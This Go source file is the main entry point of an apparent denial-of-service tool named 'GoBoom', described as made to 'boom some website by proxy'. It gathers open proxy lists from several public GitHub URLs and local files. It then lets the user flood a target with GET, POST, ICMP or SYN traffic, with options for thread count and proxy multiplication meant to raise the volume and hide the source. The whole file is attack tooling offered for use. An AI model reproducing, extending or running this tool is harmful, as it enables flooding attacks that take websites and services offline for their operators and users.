package main

import (
	"fmt"
	"goBoom/engines"
	"goBoom/lib"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"runtime"
	"strconv"
	"strings"

	"github.com/akamensky/argparse"
)

func getProxyList_github(link string) []string {
	//format of the list is ip:port
	//return a list of proxy
	resp, err := http.Get(link)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	//read the body of the response
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}

	proxy_list := strings.Replace(string(body), "\r", "", -1)
	return strings.Split(proxy_list, "\n")
}

func getProxyList_file(path string) []string {
	//format of the list is ip:port
	//return a list of proxy
	file, err := os.Open(path)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()
	//read the body of the response
	body, err := ioutil.ReadAll(file)
	if err != nil {
		log.Fatal(err)
	}

	proxy_list := strings.Replace(string(body), "\r", "", -1)
	return strings.Split(proxy_list, "\n")
}
func get_proxy(proxy_file []string) []string {
	//var good_proxy []string
	//get the list of proxy
	//proxy_list := getProxyList_genode()
	proxy_list := getProxyList_github("https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt")
	proxy_list = append(proxy_list, getProxyList_github("https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt")...)
	proxy_list = append(proxy_list, getProxyList_github("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt")...)
	proxy_list = append(proxy_list, getProxyList_github("https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt")...)

	if len(proxy_file) > 0 {
		for _, file := range proxy_file {
			proxy_list = append(proxy_list, getProxyList_file(file)...)
		}
	}

	//remove duplicate
	proxy_list = lib.RemoveDuplicates(proxy_list)
	return proxy_list
}

func main() {
	parser := argparse.NewParser("GoBoom", "Boom some website by proxy")
	get := parser.String("", "get", &argparse.Options{Required: false, Help: "Url (get) to boom"})
	post := parser.String("", "post", &argparse.Options{Required: false, Help: "Url (post) to boom"})
	post_data := parser.String("", "post-data", &argparse.Options{Required: false, Help: "Path to file with data to send with post"})
	tcp := parser.String("", "tcp", &argparse.Options{Required: false, Help: "Ip to boom with tcp"})
	udp := parser.String("", "udp", &argparse.Options{Required: false, Help: "Ip to boom with udp"})
	icmp := parser.String("", "icmp", &argparse.Options{Required: false, Help: "Ip to boom with icmp"})
	syn := parser.String("", "syn", &argparse.Options{Required: false, Help: "Ip to boom with syn"})
	threads := parser.String("t", "threads", &argparse.Options{Required: false, Help: "Number of core to use (int)", Default: "max"})
	proxy_file := parser.StringList("p", "proxy-file", &argparse.Options{Required: false, Help: "Proxy file(s), separate with a ',' each files. Format of file(s) must be ip:port", Default: []string{}})
	proxy_mult := parser.Int("x", "proxy-mult", &argparse.Options{Required: false, Help: "You can multiply the working proxys detected with this option", Default: 0})
	mode := parser.Int("m", "mode", &argparse.Options{Required: false, Help: "Mode of attack, 1 for pass all traffic trough proxy, 2 don't use proxy", Default: 1})
	err := parser.Parse(os.Args)
	if err != nil {
		fmt.Print(parser.Usage(err))
		os.Exit(1)
	}

	//set max GOMAXPROCS
	//detect the number of cpu
	cpu := runtime.NumCPU()
	//if threads superior to cpu convert to cpu
	if *threads == "max" {
		runtime.GOMAXPROCS(cpu)
	} else {
		threads_int, err := strconv.Atoi(*threads)
		if err != nil {
			fmt.Println("Error with threads")
			os.Exit(1)
		}
		if threads_int > cpu && *mode == 1 {
			runtime.GOMAXPROCS(cpu)
		} else {
			runtime.GOMAXPROCS(threads_int)
			cpu = threads_int
		}
	}

	good_proxy := []string{}

	if *get != "" {
		if *mode == 1 {
			//get the list of proxy
			good_proxy := get_proxy(*proxy_file)
			fmt.Println("Good proxy : ", len(good_proxy))
			//multiply the good proxy
			for i := 0; i < *proxy_mult; i++ {
				good_proxy = append(good_proxy, good_proxy...)
			}
			state := engines.Get(*get, good_proxy, cpu)
			if state != "" {
				fmt.Println(state)
			}
			fmt.Println("Proxy to be used : ", len(good_proxy))
		}
		if *mode == 2 {
			state := engines.Get(*get, good_proxy, cpu)
			if state != "" {
				fmt.Println(state)
			}
		}
	} else if *post != "" {
		engines.Post(*post, good_proxy, cpu, *post_data)
	} else if *tcp != "" {
		os.Exit(1)
	} else if *udp != "" {
		os.Exit(1)
	} else if *icmp != "" {
		engines.Icmp(*icmp, good_proxy, cpu)
	} else if *syn != "" {
		engines.Syn(*syn, good_proxy, cpu)
	} else {
		fmt.Println(parser.Usage(err))
		os.Exit(1)
	}
}
